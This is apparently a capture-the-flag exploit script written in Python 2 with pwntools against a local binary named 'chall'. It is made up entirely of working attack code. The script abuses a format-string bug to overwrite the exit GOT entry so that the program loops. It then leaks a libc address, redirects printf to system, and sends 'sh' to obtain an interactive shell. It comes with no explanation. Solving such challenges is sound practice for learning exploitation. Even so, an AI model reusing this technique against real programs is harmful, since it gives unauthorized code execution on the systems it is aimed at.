#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
#context.log_level = "debug"

global io
breakpoints = '''
break *0x804871b
break *0x8048bc6
break *0x8048b90
continue
continue
'''
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
        io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)
'''
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

main = 0x804871b

rand = libc.symbols["rand"]
system = libc.symbols["system"]
binsh = next(libc.search("/bin/sh\x00"))

exit_got = exe.got["exit"]
printf_got = exe.got["printf"]

writes = {exit_got:main}
exit_ow = fmtstr_payload(5,writes,numbwritten=4)


def main(pyld):
    reu("Send me the program: ")
    sl(pyld)
    sl(",")
    sl("\\")


#io = gdb.debug(exe.path,gdbscript=breakpoints)
count = 0
while True:
    count += 1
    try:
        io = process(exe.path)
        main("?AAA"+exit_ow)

        main("?%-x")

        rl()
        leak = int(rl()[1:9],16)-rand-6
        log.info("Libc leak -> "+hex(leak))


        writes = {printf_got:leak+system}
        printf_ow = fmtstr_payload(5,writes,numbwritten=4)

        main("?AAA"+printf_ow)

        rl()
        assert re(1) == "?"

        main("?AA;\nsh\x00")

        sl("ls")

        #if "chall" not in io.recv(timeout=1):
        #    io.close()
        #    continue
        log.info("Count:"+str(count))
        io.interactive()

    except:
        io.close()